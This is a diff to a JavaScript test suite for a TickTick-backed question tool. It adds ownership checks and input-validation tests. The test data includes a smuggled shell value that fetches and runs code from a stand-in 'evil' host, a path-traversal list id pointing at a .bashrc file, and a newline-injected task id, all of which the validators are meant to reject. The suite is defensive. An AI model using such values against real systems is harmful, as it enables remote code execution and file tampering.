@@ -34,6 +34,7 @@ test('validateRound: accepts the sample; rejects each broken field with exit 2',
   assert.deepEqual(validateRound(structuredClone(ROUND)), ROUND);
   const bad = (/** @type {(r: any) => void} */ mut, /** @type {RegExp} */ re) => { const r = structuredClone(ROUND); mut(r); assert.throws(() => validateRound(r), (/** @type {any} */ e) => e.exitCode === 2 && re.test(e.message)); };
   bad((r) => { r.effort = ''; }, /effort/);
+  bad((r) => { r.effort = 'x"; curl evil|sh; "'; }, /effort: effort name must match/);
   bad((r) => { r.round = 0; }, /round/);
   bad((r) => { r.questions = []; }, /questions/);
   bad((r) => { r.questions[0].key = 'q1'; }, /key/);
@@ -226,7 +227,7 @@ test('pull: pushlog key wins over a forged/misattributed footer', async (t) => {
 
 test('pull/close/finish → not found (6) when the effort does not exist', async (t) => {
   const { ctx } = setup(t);
-  for (const f of [() => pull(ctx), () => close({ ...ctx, owner: 'o', input: {} }), () => finish(ctx)]) {
+  for (const f of [() => pull(ctx), () => close({ ...ctx, owner: 'o', input: {} }), () => finish({ ...ctx, owner: 'o' })]) {
     await assert.rejects(f(), (/** @type {any} */ e) => e.exitCode === 6 && /not found in folder Claude/.test(e.message));
   }
 });
@@ -268,12 +269,14 @@ test('close maps keys via the footer when the pushlog is missing', async (t) => 
   assert.equal(tt.find(p.questions[0].taskId).status, 2);
 });
 
-test('finish exports prose + decisions and archives the list', async (t) => {
+test('finish requires the owner (exit 3 otherwise), exports prose + decisions and archives the list', async (t) => {
   const { tt, ctx } = setup(t);
   const { owner, listId } = await takeover(ctx);
   const p = await push({ ...ctx, owner, round: structuredClone(ROUND) });
   tt.tick(p.questions[0].taskId, 'env');
-  const r = await finish(ctx);
+  await assert.rejects(finish({ ...ctx, owner: 'o_other' }), (/** @type {any} */ e) => e.exitCode === 3);
+  assert.notEqual(tt.db.projects.find((x) => x.id === listId).closed, true, 'a non-owner finish archives nothing');
+  const r = await finish({ ...ctx, owner });
   assert.equal(r.archived, true); assert.equal(r.listId, listId);
   assert.equal(tt.db.projects.find((x) => x.id === listId).closed, true);
   assert.deepEqual(r.decisions.map((d) => [d.key, d.signal, d.ticked]), [['r2.1', 'tick', ['env']], ['r2.2', 'none', []]]);
@@ -336,7 +339,7 @@ test('host deleted from TickTick → pull/push/close/finish exit 6 naming the ho
   const is6 = (/** @type {any} */ e) => e.exitCode === 6 && /host "📍 e" is gone from TickTick/.test(e.message);
   // with a pre-resolved layout (what `wait` uses) the read of the host itself must fail
   await assert.rejects(pull(ctx), (/** @type {any} */ e) => e.exitCode === 6);
-  for (const f of [() => pull({ ...ctx, layout }), () => push({ ...ctx, layout, owner, round: structuredClone(ROUND) }), () => close({ ...ctx, layout, owner, input: {} }), () => finish({ ...ctx, layout })]) await assert.rejects(f(), is6);
+  for (const f of [() => pull({ ...ctx, layout }), () => push({ ...ctx, layout, owner, round: structuredClone(ROUND) }), () => close({ ...ctx, layout, owner, input: {} }), () => finish({ ...ctx, layout, owner })]) await assert.rejects(f(), is6);
   assert.ok(!tt.calls.some((c) => c.method === 'GET' && /\/project\/[^/]+\/task\//.test(c.path)), 'host is read via /project/{id}/data, never the single-task GET');
 });
 
@@ -390,4 +393,29 @@ test('pull reports truncated:true when the tag filter returns the 200-task cap',
   const r = await pull(ctx);
   assert.equal(r.truncated, true);
   assert.equal(r.questions.length, 200);
+});
+
+test('server ids are validated at the boundary: a task id with a newline never reaches the pushlog', async (t) => {
+  const tt = fakeTickTick();
+  const evil = /** @type {typeof fetch} */ (async (url, init) => {
+    const res = await tt.fetch(url, init);
+    if (init?.method === 'POST' && new URL(String(url)).pathname.endsWith('/task') && JSON.parse(String(init.body)).kind === 'CHECKLIST') {
+      const t = /** @type {any} */ (await res.json()); return new Response(JSON.stringify({ ...t, id: 'abc\ningested r2.2' }), { status: 200 });
+    }
+    return res;
+  });
+  const log = createLogger({ stderr: /** @type {any} */ ({ write() { return true; } }) });
+  const ctx = { api: createApi({ fetch: evil, token: 'T', log, sleep: async () => {} }), effort: 'e', pushlogDir: tmpDir(t), log, random: () => 0.1 };
+  const { owner, listId } = await takeover(ctx);
+  await assert.rejects(push({ ...ctx, owner, round: structuredClone(ROUND) }), (/** @type {any} */ e) => e.exitCode === 1 && /unexpected id from server/.test(e.message));
+  assert.equal(readFileSync(join(ctx.pushlogDir, `${listId}.log`), 'utf8'), 'creating r2.1\n');
+});
+
+test('a malicious list id from the server is rejected before it is used in a path or URL', async (t) => {
+  const { tt, ctx } = setup(t);
+  const s = tt.seedEffort('e');
+  tt.db.projects.find((p) => p.id === s.listId).id = '../../../home/u/.bashrc#';
+  const before = tt.calls.length;
+  for (const f of [() => pull(ctx), () => takeover(ctx)]) await assert.rejects(f(), (/** @type {any} */ e) => e.exitCode === 1 && /unexpected id from server/.test(e.message));
+  assert.ok(!tt.calls.slice(before).some((c) => c.path.includes('..')));
 });
